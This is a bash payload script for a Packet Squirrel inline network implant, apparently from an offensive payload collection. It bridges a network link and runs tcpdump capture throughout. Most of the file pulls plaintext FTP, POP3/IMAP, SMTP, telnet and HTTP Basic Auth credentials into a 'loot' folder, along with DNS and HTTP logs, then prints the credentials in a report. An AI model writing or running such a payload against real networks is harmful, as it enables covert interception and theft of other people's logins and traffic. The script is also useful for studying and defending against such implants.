#!/bin/bash
#
# Title:         NullSec-TrafficMirror
# Author:        bad-antics (NullSec)
# Category:      Sniffing
# Target:        Any inline network connection
# Version:       1.0
#
# Description:   Advanced traffic capture and analysis payload for the Packet Squirrel.
#                Captures network traffic in bridge mode, extracts credentials,
#                identifies protocols, and performs real-time traffic analysis.
#                Supports both pcap capture and live text extraction.
#
# LED States:
#   SETUP  (Magenta) - Initializing bridge
#   ATTACK (Yellow)  - Capturing traffic
#   FINISH (Green)   - Capture complete
#   FAIL   (Red)     - Error

# ================================
# Configuration
# ================================
CAPTURE_TIME=300          # Capture duration in seconds (5 min default)
MAX_PCAP_SIZE=50          # Max pcap file size in MB
EXTRACT_CREDS=1           # Extract plaintext credentials (1=yes, 0=no)
CAPTURE_DNS=1             # Log all DNS queries (1=yes, 0=no)
CAPTURE_HTTP=1            # Log HTTP requests (1=yes, 0=no)

# ================================
# Setup
# ================================
LED SETUP

LOOT_DIR="/mnt/loot/trafficmirror_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOOT_DIR"
LOG="$LOOT_DIR/analysis.txt"
PCAP="$LOOT_DIR/capture.pcap"

# Set bridge mode — transparent inline
NETMODE BRIDGE

sleep 3

{
    echo "============================================================"
    echo "  NullSec-TrafficMirror v1.0 — Traffic Analysis Report"
    echo "  Started: $(date)"
    echo "  Capture Duration: ${CAPTURE_TIME}s"
    echo "============================================================"
    echo ""
} > "$LOG"

# ================================
# Capture Phase
# ================================
LED ATTACK

# Start main pcap capture
tcpdump -i br-lan -w "$PCAP" -c 100000 -s 0 \
    "not (host 172.16.32.1 and port 22)" &
TCPDUMP_PID=$!

# DNS query logging
if [ "$CAPTURE_DNS" = "1" ]; then
    tcpdump -i br-lan -l -nn port 53 2>/dev/null | \
        grep -oP 'A\? \K[^ ]+' | sort -u > "$LOOT_DIR/dns_queries.txt" &
    DNS_PID=$!
fi

# HTTP request logging
if [ "$CAPTURE_HTTP" = "1" ]; then
    tcpdump -i br-lan -l -A -nn port 80 2>/dev/null | \
        grep -E "^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH) " | \
        head -500 > "$LOOT_DIR/http_requests.txt" &
    HTTP_PID=$!
fi

# Credential extraction (plaintext protocols)
if [ "$EXTRACT_CREDS" = "1" ]; then
    (
        # FTP credentials
        tcpdump -i br-lan -l -A -nn port 21 2>/dev/null | \
            grep -iE "^(USER|PASS) " >> "$LOOT_DIR/credentials.txt" &

        # Telnet capture
        tcpdump -i br-lan -l -A -nn port 23 2>/dev/null | \
            grep -E ".{3,}" | head -200 >> "$LOOT_DIR/telnet_capture.txt" &

        # SMTP credentials
        tcpdump -i br-lan -l -A -nn port 25 2>/dev/null | \
            grep -iE "^(AUTH|MAIL FROM|RCPT TO)" >> "$LOOT_DIR/smtp_capture.txt" &

        # HTTP Basic Auth
        tcpdump -i br-lan -l -A -nn port 80 2>/dev/null | \
            grep -i "Authorization: Basic" >> "$LOOT_DIR/credentials.txt" &

        # POP3/IMAP
        tcpdump -i br-lan -l -A -nn "port 110 or port 143" 2>/dev/null | \
            grep -iE "^(USER|PASS|LOGIN)" >> "$LOOT_DIR/credentials.txt" &

        wait
    ) &
    CRED_PID=$!
fi

# Wait for capture duration
sleep "$CAPTURE_TIME"

# ================================
# Cleanup & Analysis
# ================================

# Stop all captures
kill $TCPDUMP_PID 2>/dev/null
[ -n "$DNS_PID" ] && kill $DNS_PID 2>/dev/null
[ -n "$HTTP_PID" ] && kill $HTTP_PID 2>/dev/null
[ -n "$CRED_PID" ] && kill $CRED_PID 2>/dev/null
wait 2>/dev/null

# Generate analysis report
{
    echo "[+] CAPTURE STATISTICS"
    PCAP_SIZE=$(du -h "$PCAP" 2>/dev/null | awk '{print $1}')
    echo "    Pcap size: $PCAP_SIZE"
    echo "    Duration:  ${CAPTURE_TIME}s"
    echo ""

    if [ -f "$LOOT_DIR/dns_queries.txt" ]; then
        DNS_COUNT=$(wc -l < "$LOOT_DIR/dns_queries.txt" 2>/dev/null)
        echo "[+] DNS QUERIES ($DNS_COUNT unique domains)"
        head -50 "$LOOT_DIR/dns_queries.txt" | while read domain; do
            echo "    $domain"
        done
        if [ "$DNS_COUNT" -gt 50 ]; then
            echo "    ... and $((DNS_COUNT - 50)) more"
        fi
        echo ""
    fi

    if [ -f "$LOOT_DIR/http_requests.txt" ]; then
        HTTP_COUNT=$(wc -l < "$LOOT_DIR/http_requests.txt" 2>/dev/null)
        echo "[+] HTTP REQUESTS ($HTTP_COUNT captured)"
        head -30 "$LOOT_DIR/http_requests.txt" | while read req; do
            echo "    $req"
        done
        echo ""
    fi

    if [ -f "$LOOT_DIR/credentials.txt" ]; then
        CRED_COUNT=$(wc -l < "$LOOT_DIR/credentials.txt" 2>/dev/null)
        if [ "$CRED_COUNT" -gt 0 ]; then
            echo "[!] CREDENTIALS FOUND ($CRED_COUNT entries)"
            cat "$LOOT_DIR/credentials.txt" | while read cred; do
                echo "    $cred"
            done
        else
            echo "[*] No plaintext credentials captured"
        fi
        echo ""
    fi

    # Protocol breakdown from pcap
    echo "[+] PROTOCOL BREAKDOWN"
    if command -v tcpdump &>/dev/null; then
        tcpdump -r "$PCAP" -nn 2>/dev/null | \
            awk '{print $NF}' | sort | uniq -c | sort -rn | head -20 | \
            while read count proto; do
                echo "    $count  $proto"
            done
    fi
    echo ""

    # Source/Destination IP breakdown
    echo "[+] TOP TALKERS (by packet count)"
    tcpdump -r "$PCAP" -nn 2>/dev/null | \
        grep -oP 'IP \K[0-9.]+' | sort | uniq -c | sort -rn | head -15 | \
        while read count ip; do
            echo "    $count packets  $ip"
        done
    echo ""

    echo "============================================================"
    echo "  Capture complete: $(date)"
    echo "============================================================"
} >> "$LOG" 2>&1

LED FINISH
